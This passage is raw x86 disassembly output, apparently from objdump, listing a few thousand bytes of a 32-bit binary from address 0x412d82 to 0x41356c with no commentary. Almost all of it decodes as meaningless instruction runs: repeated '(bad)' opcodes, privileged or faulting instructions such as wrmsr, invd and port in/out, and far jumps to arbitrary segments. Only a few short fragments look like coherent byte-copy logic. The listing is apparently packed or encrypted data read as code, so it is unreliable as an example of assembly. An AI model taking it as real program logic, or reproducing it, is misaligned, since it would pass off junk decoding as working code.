  412d82:	xor    ebx,ebp
  412d84:	sub    bh,BYTE PTR [esi]
  412d86:	xor    ch,al
  412d88:	fsubp  st(2),st
  412d8a:	pop    ecx
  412d8b:	scas   al,BYTE PTR es:[edi]
  412d8c:	ror    BYTE PTR [esi-0x1d66c807],0x8f
  412d93:	pop    edi
  412d94:	cmp    ebx,DWORD PTR [esi-0x5674fd41]
  412d9a:	push   ebp
  412d9b:	outs   dx,BYTE PTR ds:[esi]
  412d9c:	mov    edi,0x18e0494c
  412da1:	mov    es,WORD PTR [esp+eiz*8]
  412da4:	mov    edx,0x6206469d
  412da9:	cdq    
  412daa:	sbb    DWORD PTR [ebp-0x5738d46a],edi
  412db0:	cmc    
  412db1:	mov    edx,cr7
  412db4:	mov    esp,DWORD PTR [eax+0x4f]
  412db7:	aam    0xc8
  412db9:	jg     0x412d72
  412dbb:	enter  0x3f37,0x87
  412dbf:	mov    bh,0x4
  412dc1:	push   0x63
  412dc3:	popa   
  412dc4:	mov    bl,0xb4
  412dc6:	in     al,dx
  412dc7:	mov    ecx,0x9a58f34a
  412dcc:	jg     0x412dda
  412dce:	pushf  
  412dcf:	inc    edi
  412dd0:	repz and DWORD PTR [ebp-0x52],ecx
  412dd4:	arpl   ax,bx
  412dd6:	jno    0x412d7d
  412dd8:	mov    ds:0x32e5ce2c,al
  412ddd:	mov    ch,BYTE PTR [edx+0x4f]
  412de0:	sub    ecx,DWORD PTR [esi-0x3db293fb]
  412de6:	or     eax,0x66ac1180
  412deb:	stos   BYTE PTR es:[edi],al
  412dec:	outs   dx,DWORD PTR ds:[esi]
  412ded:	pop    es
  412dee:	ss dec ebp
  412df0:	add    ebp,ecx
  412df2:	loop   0x412dbe
  412df4:	jecxz  0x412e13
  412df6:	clc    
  412df7:	cmp    DWORD PTR [eax+0x78],0x41334e10
  412dfe:	sub    al,0xc
  412e00:	mov    edx,0xf1ec0e96
  412e05:	dec    DWORD PTR [esi]
  412e07:	sub    esp,DWORD PTR [ecx-0x73118175]
  412e0d:	mov    ecx,0xa68d50cc
  412e13:	cmc    
  412e14:	pop    edx
  412e15:	(bad)  
  412e17:	in     al,0x2
  412e19:	jmp    0x412dd6
  412e1b:	data16 and al,0x90
  412e1e:	xchg   esp,eax
  412e1f:	xor    eax,0x4a9ef613
  412e24:	push   ebp
  412e25:	psubusb mm5,mm6
  412e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e29:	cld    
  412e2a:	fadd   DWORD PTR [edx]
  412e2c:	sbb    dh,BYTE PTR [esi-0x5d]
  412e2f:	lds    esp,FWORD PTR [ecx+0x24]
  412e32:	mov    dh,0x88
  412e34:	loope  0x412e46
  412e36:	pop    ds
  412e37:	pop    ds
  412e38:	aam    0x5c
  412e3a:	xchg   DWORD PTR [eax+0x5c],edi
  412e3d:	xchg   ecx,eax
  412e3e:	fadd   st,st(1)
  412e40:	xchg   esi,eax
  412e41:	pop    ds
  412e42:	xchg   BYTE PTR [ecx+0x1f],ah
  412e45:	fs pop ds
  412e47:	jmp    0x5b1:0x7c45e713
  412e4e:	dec    ecx
  412e4f:	inc    esi
  412e50:	nop
  412e51:	sub    BYTE PTR [ecx+0x4337158],cl
  412e57:	mov    cl,al
  412e59:	mul    ah
  412e5b:	mov    esi,0x2475fb7e
  412e60:	jmp    0x1c3c:0xd659ef6d
  412e67:	cld    
  412e68:	lds    esi,FWORD PTR [edx+0x3d6050e0]
  412e6e:	xor    BYTE PTR [ebp+0x1870782a],ch
  412e74:	shl    BYTE PTR [edi],1
  412e76:	push   ds
  412e77:	jg     0x412e34
  412e79:	cld    
  412e7a:	cmp    esp,DWORD PTR [edi-0x68]
  412e7d:	(bad)  
  412e7e:	cmp    eax,0x9f191179
  412e83:	push   0x20e1328b
  412e88:	mov    ds,WORD PTR [edi+0x11]
  412e8b:	cs ret 0x77c4
  412e8f:	sub    eax,0x94259f64
  412e94:	outs   dx,DWORD PTR ds:[esi]
  412e95:	pop    ebp
  412e96:	add    bl,cl
  412e98:	jge    0x412eef
  412e9a:	xor    edx,esp
  412e9c:	sbb    eax,esp
  412e9e:	(bad)  
  412ea0:	jmp    0xe7fe:0xa667e9d3
  412ea7:	int3   
  412ea8:	xchg   esp,eax
  412ea9:	sub    eax,DWORD PTR [edx]
  412eab:	out    0x17,eax
  412ead:	sbb    dl,BYTE PTR [ebx+0x57]
  412eb0:	lock sti 
  412eb2:	pushf  
  412eb3:	sbb    eax,0x201daee6
  412eb8:	addr16 mov ds:0x658f,al
  412ebc:	imul   esp,DWORD PTR [ebx-0x46],0x4c3e26cc
  412ec3:	inc    eax
  412ec4:	mov    dh,BYTE PTR [ebx+0x23]
  412ec7:	inc    edx
  412ec8:	shr    DWORD PTR [edi+0x760feb00],0x29
  412ecf:	popa   
  412ed0:	cwde   
  412ed1:	xchg   ebp,eax
  412ed2:	inc    esi
  412ed3:	push   ds
  412ed4:	mov    bl,0x82
  412ed6:	bound  esp,QWORD PTR [eax]
  412ed8:	xchg   esp,eax
  412ed9:	or     ah,BYTE PTR [ecx+0x15]
  412edc:	enter  0xe1be,0x55
  412ee0:	adc    BYTE PTR [esi-0x45],ch
  412ee3:	pop    ds
  412ee4:	repnz fld DWORD PTR [esi-0x5943e90e]
  412eeb:	pop    esp
  412eec:	sbb    BYTE PTR [ebp+0x55],bh
  412eef:	mov    DWORD PTR [edx],ebx
  412ef1:	js     0x412ec7
  412ef3:	mov    dh,0xbd
  412ef5:	mov    cl,0xf7
  412ef7:	sub    DWORD PTR [eax+ecx*4+0x55],ebp
  412efb:	jnp    0xd0752356
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x6d
  412f26:	stc    
  412f27:	test   ebp,ebx
  412f29:	imul   esi,DWORD PTR [ebp+0x78],0x787ee578
  412f30:	js     0x412ed4
  412f32:	mov    esi,0x3f0068a6
  412f37:	jge    0x412f0b
  412f39:	inc    BYTE PTR [edx-0x7404f100]
  412f3f:	push   ss
  412f40:	xchg   edi,eax
  412f41:	in     al,0x8f
  412f43:	(bad)
  412f46:	addr16 shr edx,1
  412f49:	out    dx,eax
  412f4a:	data16 scas al,BYTE PTR es:[edi]
  412f4c:	ss push ebp
  412f4e:	jle    0x412f91
  412f50:	ja     0x412fc0
  412f52:	out    dx,al
  412f53:	or     eax,0x7ad85154
  412f58:	pop    esp
  412f59:	aad    0x58
  412f5b:	mov    ch,0x59
  412f5d:	cmp    al,dl
  412f5f:	mov    edi,0x4d5c868f
  412f64:	cmp    BYTE PTR [esi],dh
  412f66:	mov    esi,0x54e639d0
  412f6b:	push   edx
  412f6c:	mov    BYTE PTR [ecx+0x57],al
  412f6f:	sub    DWORD PTR [ebx],ebp
  412f71:	inc    esi
  412f72:	xchg   edx,eax
  412f73:	pop    ds
  412f74:	std    
  412f75:	nop
  412f76:	push   es
  412f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f78:	add    eax,eax
  412f7a:	imul   ecx,esi,0xffffff81
  412f7d:	cs das 
  412f7f:	push   0xffffff8e
  412f81:	sahf   
  412f82:	mov    edi,DWORD PTR [ebx+0x6f]
  412f85:	xchg   edx,eax
  412f86:	push   esp
  412f87:	aaa    
  412f88:	mov    cl,0xfe
  412f8a:	and    BYTE PTR [ebp+0x7b],cl
  412f8d:	xor    esp,DWORD PTR [ebx]
  412f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f90:	mov    edi,0xf94c8753
  412f95:	call   0x2316:0xe34a74bf
  412f9c:	add    al,cl
  412f9e:	loopne 0x412f7f
  412fa0:	push   es
  412fa1:	pop    ebp
  412fa2:	outs   dx,DWORD PTR ds:[esi]
  412fa3:	cmp    cl,BYTE PTR [ecx+0x6ed9112d]
  412fa9:	imul   BYTE PTR [ecx+0x58672f39]
  412faf:	repz mov eax,0xe8b06fe2
  412fb5:	add    DWORD PTR ds:0xbfbe901e,edx
  412fbb:	sbb    BYTE PTR [edx+ebp*1-0x3f9b0a33],dh
  412fc2:	in     eax,0xef
  412fc4:	mov    eax,0x1a47c1f7
  412fc9:	fsubr  QWORD PTR [ebx+0x107d413d]
  412fcf:	inc    eax
  412fd0:	jns    0x412fda
  412fd2:	pop    es
  412fd3:	(bad)  [eax+0x46]
  412fd6:	in     eax,dx
  412fd7:	inc    esi
  412fd8:	jmp    0x413024
  412fda:	ja     0x412f6f
  412fdc:	int    0x7d
  412fde:	scas   al,BYTE PTR es:[edi]
  412fdf:	mov    bl,BYTE PTR [ecx+0x47a6acd9]
  412fe5:	call   0xf983db21
  412fea:	out    0x34,eax
  412fec:	mov    ebp,cs
  412fee:	jno    0x412fb6
  412ff0:	call   0x1a710a76
  412ff5:	jae    0x413027
  412ff7:	lods   al,BYTE PTR es:[esi]
  412ff9:	push   es
  412ffa:	stos   DWORD PTR es:[edi],eax
  412ffb:	loope  0x412f84
  412ffd:	cmp    BYTE PTR ds:0x323379ac,0x10
  413004:	pusha  
  413005:	popa   
  413006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413007:	daa    
  413008:	xchg   BYTE PTR [edi-0x78],cl
  41300b:	js     0x413049
  41300d:	pop    eax
  41300e:	(bad)  
  41300f:	cmp    eax,0xb28edcce
  413014:	ins    BYTE PTR es:[edi],dx
  413015:	fistp  WORD PTR [ecx]
  413017:	aas    
  413018:	push   ds
  413019:	and    bl,BYTE PTR [edx]
  41301b:	fiadd  DWORD PTR [edx+0x71]
  41301e:	sub    BYTE PTR [esi+0x26],ah
  413021:	add    bh,bl
  413023:	fld    DWORD PTR [esi+0x5bc7d5d6]
  413029:	sub    al,0x2c
  41302b:	jecxz  0x41308b
  41302d:	cs push ebp
  41302f:	inc    ebp
  413030:	xor    DWORD PTR [edx+0x25decbad],ecx
  413036:	rcr    DWORD PTR [ebp+0x2ffe5f35],1
  41303c:	(bad)  
  41303d:	shr    ah,cl
  41303f:	fidivr WORD PTR [eax-0x7e8dcf2a]
  413045:	out    dx,al
  413046:	cmp    ebx,ebp
  413048:	xor    al,0x88
  41304a:	int3   
  41304b:	mov    dh,0x4b
  41304d:	mov    BYTE PTR [esi-0x54cdc851],0xe5
  413054:	adc    al,0x79
  413056:	push   0x38
  413058:	jmp    0x7b6a:0xc5e33c81
  41305f:	pushf  
  413060:	hlt    
  413061:	inc    esp
  413062:	jae    0x4130c8
  413064:	shr    eax,cl
  413066:	cmp    DWORD PTR fs:0x6e89c4f2,eax
  41306d:	scas   eax,DWORD PTR es:[edi]
  41306e:	push   ss
  41306f:	adc    bl,BYTE PTR [ebx-0x72]
  413072:	icebp  
  413073:	loopne 0x41304a
  413075:	jmp    0x7b45:0x9ae039ef
  41307c:	xor    ebx,esp
  41307e:	daa    
  41307f:	test   al,0x77
  413081:	xor    esp,DWORD PTR [edi+0x62]
  413084:	mov    al,0x82
  413086:	jb     0x4130de
  413088:	mov    dh,0x3a
  41308a:	cmp    ch,BYTE PTR [edi+0x2b]
  41308d:	icebp  
  41308e:	cmp    eax,0xa650a6a8
  413093:	and    ebx,DWORD PTR [ecx-0x7b]
  413096:	call   0xa3a770ee
  41309b:	adc    al,0xb0
  41309d:	fst    DWORD PTR [edx+0x5ef96d06]
  4130a3:	pop    eax
  4130a4:	adc    DWORD PTR [ecx-0xa19b333],edi
  4130aa:	mov    ebx,0xc0dd89e5
  4130af:	push   edx
  4130b0:	dec    edi
  4130b1:	or     eax,0xd4ca99da
  4130b6:	invd   
  4130b8:	xchg   edi,eax
  4130b9:	pop    es
  4130ba:	pushf  
  4130bb:	add    eax,0x1116d8dd
  4130c0:	ror    DWORD PTR [edx-0x26],1
  4130c3:	mov    eax,0x9b0a74bb
  4130c8:	mov    dl,bl
  4130ca:	jne    0x41313d
  4130cc:	call   0x9bf1:0x994309ea
  4130d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d4:	(bad)  
  4130d6:	xor    bh,dl
  4130d8:	fwait
  4130d9:	xor    eax,0x7bf9fae3
  4130de:	dec    edi
  4130df:	jecxz  0x413125
  4130e1:	in     eax,dx
  4130e2:	inc    edx
  4130e3:	retf   0x466c
  4130e6:	jecxz  0x41313a
  4130e8:	add    BYTE PTR [ebx-0x4d],bl
  4130eb:	daa    
  4130ec:	jecxz  0x413157
  4130ee:	ret    0x1a08
  4130f1:	pop    es
  4130f2:	loopne 0x41312c
  4130f4:	loopne 0x41313f
  4130f6:	inc    BYTE PTR [ecx-0x61886814]
  4130fc:	(bad)  
  4130fd:	fadd   QWORD PTR ds:0xf462c1a2
  413103:	cmc    
  413104:	mov    ah,0x50
  413106:	retf   
  413107:	xchg   ecx,eax
  413108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413109:	sbb    dl,BYTE PTR gs:[edi-0x690cd6b]
  413110:	pop    edi
  413111:	xchg   ebp,edi
  413113:	je     0x413159
  413115:	lock sbb ebx,DWORD PTR [eax]
  413118:	sub    BYTE PTR [esi+0x79153b56],dl
  41311e:	out    0xc1,eax
  413120:	mov    ah,0xc0
  413122:	ficom  DWORD PTR [ebp-0x54]
  413125:	mov    eax,0xb601c0bd
  41312a:	mov    ebp,DWORD PTR [ebx]
  41312c:	jmp    0xc9da:0x96ce40e3
  413133:	out    dx,al
  413134:	lods   eax,DWORD PTR ds:[esi]
  413135:	and    edx,DWORD PTR [esi+0x74]
  413138:	ins    DWORD PTR es:[edi],dx
  413139:	inc    ebx
  41313a:	xor    BYTE PTR ss:[eax+esi*1+0x65],dh
  41313f:	cli    
  413140:	loopne 0x41314e
  413142:	and    esi,ecx
  413144:	push   ebp
  413145:	adc    eax,0x3db14acb
  41314a:	in     al,0x8c
  41314c:	and    al,0xc4
  41314e:	fist   DWORD PTR [esi]
  413150:	push   ss
  413151:	inc    eax
  413152:	adc    al,dh
  413154:	stc    
  413155:	ror    DWORD PTR [esi],cl
  413157:	xor    DWORD PTR [edi+0x79f0a607],0x6a193b21
  413161:	xchg   edi,eax
  413162:	adc    esp,DWORD PTR [edx+ebp*2+0x7f]
  413166:	test   DWORD PTR [ecx-0x51dfa10d],ebp
  41316c:	fisttp WORD PTR [ecx]
  41316e:	rol    DWORD PTR [ebx+0x3dd6f1e6],cl
  413174:	arpl   di,cx
  413176:	in     eax,dx
  413177:	push   ecx
  413178:	ret    
  413179:	or     BYTE PTR [esi-0x21],cl
  41317c:	xchg   DWORD PTR [ecx],ebp
  41317e:	shl    DWORD PTR [edi-0x55eefcbd],1
  413184:	or     BYTE PTR [esi+ecx*4+0x78],0x38
  413189:	je     0x4131ef
  41318b:	rcr    DWORD PTR [eax+0x1],1
  41318e:	test   DWORD PTR [ebx-0x56],edi
  413191:	fstp   QWORD PTR [esi+ebx*2+0x511bceb1]
  413198:	and    al,0x95
  41319a:	xchg   edi,eax
  41319b:	mov    BYTE PTR [ebx-0x7cc0b83],cl
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	push   ebx
  4131c8:	jo     0x413163
  4131ca:	and    edx,esi
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x4131e4
  4131d4:	and    ecx,esi
  4131d6:	mov    bh,0xa6
  4131d8:	imul   ecx,DWORD PTR ds:0x8c278461,0x5ae3c390
  4131e2:	loopne 0x41322f
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	sub    BYTE PTR [edi+0x1a],dh
  4131e8:	sbb    DWORD PTR [ebx+0x17],edx
  4131eb:	fsubr  st(7),st
  4131ed:	(bad)  
  4131ee:	imul   ecx,DWORD PTR [edx],0x9164079f
  4131f4:	aam    0x3e
  4131f6:	xchg   ecx,eax
  4131f7:	test   al,0xc4
  4131f9:	mov    ebx,0xb80974a6
  4131fe:	inc    esi
  4131ff:	push   ss
  413200:	and    ah,dh
  413202:	std    
  413203:	mov    ds:0xb6e98895,al
  413208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41320a:	imul   esp,DWORD PTR [esi+ebx*4-0x6d406135],0xffffff80
  413212:	imul   esp,DWORD PTR [ebx+0x20],0xffffff91
  413216:	es adc al,0xc
  413219:	repnz out 0x6,eax
  41321c:	dec    esi
  41321d:	dec    eax
  41321e:	aaa    
  41321f:	call   0x825b3692
  413224:	cmp    DWORD PTR [esi+0x57],0x48ab862f
  41322b:	adc    al,0x1c
  41322d:	mov    al,ds:0x82b1a769
  413232:	in     al,0x48
  413234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413235:	jle    0x413210
  413237:	dec    ebp
  413238:	test   DWORD PTR [esi+0x79],ebp
  41323b:	sbb    eax,eax
  41323d:	jno    0x4131de
  41323f:	xlat   BYTE PTR ds:[ebx]
  413240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413241:	iret   
  413242:	sbb    DWORD PTR [eax-0x1af813e3],0xffffff8c
  413249:	stos   BYTE PTR es:[edi],al
  41324a:	call   0xe8c6:0x60594c2c
  413251:	xchg   ah,ah
  413253:	jne    0x413267
  413255:	ins    DWORD PTR es:[edi],dx
  413256:	pushf  
  413257:	int3   
  413258:	mov    ss,esi
  41325a:	mov    cl,0x1a
  41325c:	mov    ecx,0xd34a10f2
  413261:	add    eax,0x4765b732
  413266:	cmp    al,0x2e
  413268:	mov    al,0xa5
  41326a:	fidiv  WORD PTR ds:0x5737a7d8
  413270:	xchg   edi,eax
  413271:	push   ss
  413272:	push   esi
  413273:	mov    cs:0x3404602c,eax
  413279:	repnz or eax,DWORD PTR [ecx+0x56]
  41327d:	cdq    
  41327e:	loopne 0x4132bc
  413280:	jle    0x4132ab
  413282:	popa   
  413283:	fisub  WORD PTR [esi]
  413285:	lock cwde 
  413287:	inc    ebp
  413288:	pop    ebp
  413289:	push   esp
  41328a:	jb     0x413287
  41328c:	or     dh,BYTE PTR [edx+ebp*8+0x7e]
  413290:	stc    
  413291:	jno    0x413251
  413293:	pop    edx
  413294:	mov    esp,0xab999d6
  413299:	fdiv   DWORD PTR ds:0x28a16049
  41329f:	aam    0x43
  4132a1:	xchg   esi,eax
  4132a2:	(bad)  
  4132a3:	in     eax,0x9a
  4132a5:	rcr    ecx,0x5e
  4132a8:	add    DWORD PTR [edx],ebx
  4132aa:	inc    edx
  4132ab:	test   cl,ch
  4132ad:	push   esi
  4132ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132af:	ror    DWORD PTR [eax+eax*4+0x23418d7e],cl
  4132b6:	push   es
  4132b7:	cmp    ebx,edx
  4132b9:	or     dh,BYTE PTR [ecx+0x163662ed]
  4132bf:	pop    esi
  4132c0:	adc    eax,0xe360e517
  4132c5:	popf   
  4132c6:	jecxz  0x413250
  4132c8:	add    DWORD PTR [eax-0x30],edi
  4132cb:	and    eax,0x5015c8cd
  4132d0:	push   ecx
  4132d1:	mov    ebx,0x90e35240
  4132d6:	(bad)  
  4132d7:	mov    eax,ds:0xf6790f22
  4132dc:	lea    edi,[esi+0x2978042c]
  4132e2:	pop    ecx
  4132e3:	daa    
  4132e4:	jle    0x4132b4
  4132e6:	sbb    edx,ecx
  4132e8:	scas   al,BYTE PTR es:[edi]
  4132e9:	inc    eax
  4132ea:	cwde   
  4132eb:	mov    eax,ds:0x2db6f903
  4132f0:	cmp    BYTE PTR [ebx],ah
  4132f2:	inc    esp
  4132f3:	nop
  4132f4:	mov    BYTE PTR [edx-0x62],bh
  4132f7:	mov    ch,0x57
  4132f9:	pushf  
  4132fa:	bound  edx,QWORD PTR [ebx-0x7b]
  4132fd:	pop    esp
  4132fe:	cwde   
  4132ff:	and    ch,BYTE PTR [edi+0x14f19130]
  413305:	push   ecx
  413306:	xchg   esi,eax
  413307:	cwde   
  413308:	dec    ebx
  413309:	adc    BYTE PTR [ecx-0xd],bl
  41330c:	stos   DWORD PTR es:[edi],eax
  41330d:	xchg   DWORD PTR [esi-0x14],ebx
  413310:	pop    eax
  413311:	popa   
  413312:	out    0x4a,al
  413314:	and    al,0xc7
  413316:	cmp    bl,bh
  413318:	sti    
  413319:	hlt    
  41331a:	test   DWORD PTR [ecx+0x7e],0x7df15e91
  413321:	jecxz  0x4132e9
  413323:	imul   BYTE PTR [eax+0x17db6b45]
  413329:	cmp    eax,0xe47dde25
  41332e:	adc    DWORD PTR fs:[edx-0x20],edi
  413332:	pop    eax
  413333:	ja     0x413386
  413335:	mov    al,0x80
  413337:	dec    ebx
  413338:	push   ebx
  413339:	imul   DWORD PTR [esi-0x1a7fca89]
  41333f:	dec    edx
  413340:	outs   dx,BYTE PTR ds:[esi]
  413341:	adc    ah,al
  413343:	or     eax,0x5970165f
  413348:	sbb    eax,0x14c898d
  41334d:	mov    ch,0xc1
  41334f:	or     ah,BYTE PTR [eax-0x48e3d2b1]
  413355:	and    bh,BYTE PTR [ecx]
  413357:	mov    dl,0xd0
  413359:	xchg   ebp,eax
  41335a:	or     DWORD PTR [esi+eax*8+0x2ba3bdfd],ecx
  413361:	sub    BYTE PTR [ebx+0x1d],dh
  413364:	fsubr  DWORD PTR [ecx+0x13]
  413367:	sahf   
  413368:	inc    ebp
  413369:	pushf  
  41336a:	mov    esi,0xc94d9676
  41336f:	test   eax,0xc2797085
  413374:	rol    BYTE PTR [ecx-0x21],0xe0
  413378:	(bad)  
  413379:	test   eax,0x7e77e092
  41337e:	imul   ebx,DWORD PTR [ebx+0x60972944],0x5f
  413385:	inc    eax
  413386:	fmul   DWORD PTR [esp+ecx*2-0x51]
  41338a:	mov    ds:0x28b1b33e,eax
  41338f:	cmc    
  413390:	je     0x4133c1
  413392:	ss je  0x41334c
  413395:	push   ecx
  413396:	mov    al,0xd5
  413398:	dec    ecx
  413399:	retf   
  41339a:	pop    edx
  41339b:	shl    DWORD PTR [esi],0xea
  41339e:	jnp    0x413323
  4133a0:	fstp   DWORD PTR [esi-0x3ce8d359]
  4133a6:	mov    al,ds:0x853faad4
  4133ab:	push   esp
  4133ac:	retf   
  4133ad:	jge    0x413372
  4133af:	or     eax,0xf30a0f42
  4133b4:	sub    eax,0xcc6fc6d6
  4133b9:	xchg   ebp,eax
  4133ba:	ja     0x413355
  4133bc:	(bad)  
  4133bd:	shl    BYTE PTR [esi],1
  4133bf:	pushf  
  4133c0:	jo     0x413391
  4133c2:	jge    0x4133a3
  4133c4:	scas   al,BYTE PTR es:[edi]
  4133c5:	mov    ds:0xac4a6d4e,eax
  4133ca:	xor    BYTE PTR [esi-0x2626b315],0xb2
  4133d1:	pop    es
  4133d2:	pop    edi
  4133d3:	pushf  
  4133d4:	mov    ?,WORD PTR fs:[edx+0x5e]
  4133d8:	jle    0x41343e
  4133da:	in     eax,dx
  4133db:	hlt    
  4133dc:	sahf   
  4133dd:	adc    eax,DWORD PTR [eax]
  4133df:	pop    esi
  4133e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133e1:	lahf   
  4133e2:	xor    al,0xf2
  4133e4:	pop    eax
  4133e5:	int    0xf8
  4133e7:	adc    al,bl
  4133e9:	fsubr  st(3),st
  4133eb:	mov    ds:0xc06bb5b2,eax
  4133f0:	(bad)  
  4133f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133f2:	test   DWORD PTR ss:[ecx+0x44],ecx
  4133f6:	dec    ebx
  4133f7:	in     al,dx
  4133f8:	sub    al,0xfb
  4133fa:	xchg   ebx,eax
  4133fb:	pop    ebx
  4133fc:	cmc    
  4133fd:	inc    edi
  4133fe:	test   BYTE PTR [eax],cl
  413400:	js     0x4133c7
  413402:	dec    eax
  413403:	pusha  
  413404:	mov    al,0xd7
  413406:	lea    eax,[ebp-0x26e751de]
  41340c:	shl    DWORD PTR [edx+0x3],cl
  41340f:	fcom   DWORD PTR [ecx]
  413411:	mov    ebx,0x6944b57d
  413416:	wrmsr  
  413418:	ins    BYTE PTR es:[edi],dx
  413419:	mov    edi,0x9cd17b9b
  41341e:	aas    
  41341f:	stc    
  413420:	leave  
  413421:	or     ebx,esi
  413423:	ja     0x41343f
  413425:	xor    al,dl
  413427:	pop    es
  413428:	std    
  413429:	add    dh,bh
  41342b:	inc    ecx
  41342c:	mov    edx,0x19cb4ed8
  413431:	mov    ah,0x20
  413433:	out    0xb6,eax
  413435:	mov    ss,WORD PTR [ebx-0x4d]
  413438:	jns    0x41347f
  41343a:	or     BYTE PTR [edi+edx*8-0x1382fcd3],0x8b
  413442:	pop    ebp
  413443:	in     al,0x88
  413445:	xchg   esp,eax
  413446:	pop    ds
  413447:	cwde   
  413448:	jb     0x41347c
  41344a:	add    cl,ch
  41344c:	add    DWORD PTR [edx],0x0
  41344f:	add    al,cl
  413451:	(bad)
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0xd98f45e
  41345f:	mov    eax,0x787f7843
  413464:	in     eax,0x7e
  413466:	js     0x4134e0
  413468:	cmp    eax,0x4bf2d10e
  41346d:	xchg   BYTE PTR [edi+ebp*1+0x1c],cl
  413471:	das    
  413472:	sbb    al,0x20
  413474:	ret    0x4fa9
  413477:	sbb    bh,BYTE PTR [edi-0x73]
  41347a:	lea    edi,[ecx+0x54]
  41347d:	(bad)  
  41347e:	jae    0x4134c7
  413480:	mov    dl,BYTE PTR [eax-0x25fb021e]
  413486:	test   bh,ch
  413488:	xor    esi,DWORD PTR [ebp-0x2]
  41348b:	lods   eax,DWORD PTR ds:[esi]
  41348c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41348d:	test   BYTE PTR [ebx+0x50444e30],0xe0
  413494:	pop    edi
  413495:	jmp    DWORD PTR [edi]
  413497:	mov    al,0x91
  413499:	jb     0x413460
  41349b:	cmp    edi,esi
  41349d:	repnz pop edi
  41349f:	addr16 dec ebx
  4134a1:	dec    esp
  4134a2:	mov    ebx,0xdb1525b2
  4134a7:	rol    BYTE PTR [esi],0xfe
  4134aa:	les    ebx,FWORD PTR [esi-0x68e43127]
  4134b0:	and    esi,0xffffffff
  4134b3:	xchg   ecx,eax
  4134b4:	push   es
  4134b5:	mov    edi,0xddcf1ba4
  4134ba:	aas    
  4134bb:	mov    BYTE PTR [ebx],0xd8
  4134be:	fs jae 0x413525
  4134c1:	dec    eax
  4134c2:	mov    eax,0x398ed44a
  4134c7:	dec    ecx
  4134c8:	xchg   edx,eax
  4134c9:	inc    esp
  4134ca:	jp     0x413450
  4134cc:	rol    BYTE PTR [esi-0x41],cl
  4134cf:	ja     0x413526
  4134d1:	das    
  4134d2:	inc    eax
  4134d3:	cmp    DWORD PTR [ecx-0x2f],ebp
  4134d6:	test   BYTE PTR [eax+0x506b2dc5],bl
  4134dc:	dec    esp
  4134dd:	test   al,0x28
  4134df:	xor    eax,0xedad445f
  4134e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134e5:	add    esp,DWORD PTR [eax+0x73]
  4134e8:	cmp    al,0x85
  4134ea:	loope  0x413492
  4134ec:	stc    
  4134ed:	push   esi
  4134ee:	fwait
  4134ef:	add    eax,DWORD PTR [esi-0x60]
  4134f2:	sub    edi,edx
  4134f4:	gs cmp eax,0x86ad8d65
  4134fa:	idiv   DWORD PTR [ecx]
  4134fc:	jb     0x4134e4
  4134fe:	xor    DWORD PTR [ecx+eax*8+0x4d866b81],0xe86d212c
  413509:	dec    esi
  41350a:	fstp   DWORD PTR [eax+ebp*2+0x3812b5c4]
  413511:	cdq    
  413512:	sbb    BYTE PTR [ebx+0x5a],ch
  413515:	ret    0xb47d
  413518:	pop    ebx
  413519:	jge    0x4134e9
  41351b:	mov    eax,0x454960d4
  413520:	shl    BYTE PTR [ebp-0x40786449],cl
  413526:	or     cl,dl
  413528:	fcomp  QWORD PTR [edx+0x63012bfb]
  41352e:	dec    ebx
  41352f:	xlat   BYTE PTR ds:[ebx]
  413530:	add    bh,dh
  413532:	jnp    0x413520
  413534:	add    al,0xbd
  413536:	mov    eax,0x1ab12dcd
  41353b:	cmp    eax,0x7fd0bb7e
  413540:	sub    eax,0x314b82eb
  413545:	push   esi
  413546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413547:	imul   edx,DWORD PTR [edx+0x41],0xffffffb1
  41354b:	xchg   ecx,eax
  41354c:	adc    bh,0x8c
  41354f:	dec    edi
  413550:	adc    DWORD PTR [edx],ecx
  413552:	pop    edi
  413553:	cwde   
  413554:	fild   WORD PTR [ebx]
  413556:	loopne 0x413558
  413558:	pop    ds
  413559:	or     BYTE PTR [ecx-0x71],dh
  41355c:	sbb    DWORD PTR [edi-0x7],ebx
  41355f:	in     al,dx
  413560:	and    ebp,DWORD PTR [edx-0x231f23ca]
  413566:	test   ecx,esi
  413568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413569:	in     eax,dx
  41356a:	xchg   DWORD PTR [eax],ebp
  41356c:	xor    al,0x6c
